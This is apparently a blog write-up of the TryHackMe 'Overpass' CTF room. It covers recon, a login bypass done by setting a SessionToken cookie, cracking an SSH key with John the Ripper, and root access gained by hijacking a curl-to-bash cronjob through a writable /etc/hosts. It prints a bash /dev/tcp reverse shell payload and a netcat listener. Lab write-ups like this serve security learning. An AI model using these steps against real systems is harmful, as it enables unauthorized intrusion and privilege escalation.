---
title: Overpass
date: 2022-12-04
draft: false
tags: ['tryhackme', 'CTF', 'Writeup', 'cookies', 'cronjob']
---

# Overpass

{{< figure src="/overpass/overpass.jpg" width=240px height=240px attr="What happens when some broke CompSci students make a password manager?" >}}

___

A CTF [room](http://tryhackme.com/room/overpass) where we will be exploiting a web based password manager.

The targets in this room are:
- user.txt
- root.txt

We'll start, as always, by adding the target's ip address to our hosts file.

``` bash
echo target-ip overpass.thm >> /etc/hosts
```

___

### Recon

Next, we'll run an nmap scan of the server.

``` bash
nmap -sC -sV -T4 overpass.thm
```

``` bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-04 14:22 EST
Nmap scan report for overpass.thm (10.10.203.217)
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37968598d1009c1463d9b03475b1f957 (RSA)
|   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA)
|_  256 1c4ada1f36546da6c61700272e67759c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 28.75 seconds
```

We've found a web server and an open SSH port.

Let's check out the website.

{{< figure src="/overpass/overpass.png" link="/overpass/overpass.png" attr="Overpass.thm" >}}

{{< figure src="/overpass/aboutus.png" link="/overpass/aboutus.png" attr="About Us" >}}

{{< figure src="/overpass/downloads.png" link="/overpass/downloads.png" attr="Downloads" >}}

We'll note down the names in the About Us section, as they may be good usernames to try and crack later, before running a Gobuster scan for any hidden directories.

``` bash
gobuster dir -u http://overpass.thm -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

``` bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://overpass.thm
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2022/12/04 14:12:18 Starting gobuster in directory enumeration mode
===============================================================
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
Progress: 220382 / 220561 (99.92%)
===============================================================
2022/12/04 14:18:33 Finished
===============================================================
```

___

### User Flag

We'll check out the admin page.

{{< figure src="/overpass/admin.png" link="/overpass/admin.png" attr="/admin/" >}}

After trying a few test credentials ("admin", "test", the names from the "About Us" page and even some SQL injection) we find that those are all duds, all returning the same "Incorrect Credentials" message.

Let's check the page source for clues.

{{< figure src="/overpass/source.png" link="/overpass/source.png" attr="view-source:http://overpass.thm/admin/" >}}

login.js seems like it could be important, let's check that out.

{{< figure src="/overpass/login.png" link="/overpass/login.png" attr="login.js" >}}

At the bottom of the page we find what makes the login form work; or more accurately, why it doesn't!

It checks for a SessionToken and if one isn't found the form returns "Incorrect Credentials"

So let's try setting one using Firefox's Inspector tool. If we click on the "Storage" tab we can set our own cookies.

We'll create a new one by clicking the "+" symbol on the right, titled "SessionToken" with a non-empty value.

Then we'll refresh the page and we're in!

{{< figure src="/overpass/cookie.png" link="/overpass/cookie.png" >}}

Once we're in we're met with an SSH key set up for james, we'll copy that to our disk and attempt to crack it with John the Ripper.


``` bash
touch rsa_key
```

Before we can crack it with John we'll have to convert it to a format John can crack, with a tool called "ssh2john"

``` bash
ssh2john rsa_key > hash.txt
```

Now we'll run that hash through John the Ripper.

``` bash
john --wordlist /usr/share/wordlists/rockyou.txt --format=SSH hash.txt
```

Now we'll attempt to login to James' account through ssh.

``` bash
ssh james@overpass.thm -i rsa_key
```

But we're met with:

``` bash
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'rsa_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "rsa_key": bad Permissions
```

Easy fix, we just need to change the permissions for the file

``` bash
chmod 600 rsa_key
```

``` bash
ssh james@overpass.thm -i rsa_key
Enter passphrase for key 'rsa_key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan 16 21:38:30 UTC 2023

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.47.232
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jan 16 21:32:16 2023 from 10.2.19.186
james@overpass-prod:~$
```

Now that we're in we'll take a look around and print the user flag.

``` bash
james@overpass-prod:~$ ls
todo.txt  user.txt

cat user.txt
```

___

### Privilege Escalation

Next we'll check out the other file

``` bash
cat todo.txt

To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website

```

Automated build script sounds like it could a cronjob, let's check.

``` bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

It's pulling the build script from a domain name, so we may be able to upload our own script if we're able to edit the hosts file.

``` bash
ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

Luckily we have write access to the hosts file, so we can redirect the cronjob to our payload.

First, we'll rewrite the hosts file to direct to our machine.

``` bash
nano /etc/hosts
```

{{< figure src="/overpass/hosts.png" link="/overpass/hosts.png" >}}

Next, we'll start preparing our attacking machine.

``` bash
mkdir -p downloads/src
touch downloads/src/buildscript.sh
echo "bash -i >& /dev/tcp/attackers-ip/9001 0>&1" > downloads/src/buildscript.sh
```

Now we'll start our netcat listener

``` bash
nc -lvnp 9001
```

And in a separate terminal window, a python server to send the payload.

``` bash
python -m http.server 80
```

After about a minute or so, we should have our connection, and our root shell!

``` bash
connect to [10.2.19.186] from (UNKNOWN) [10.10.47.232] 56340
bash: cannot set terminal process group (2518): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# 
```

Now we can print out the root flag.


``` bash
find / -name root.txt 2>/dev/null
/root/root.txt

cat /root/root.txt
```

___

## Success!

We've captured both Overpass flags!
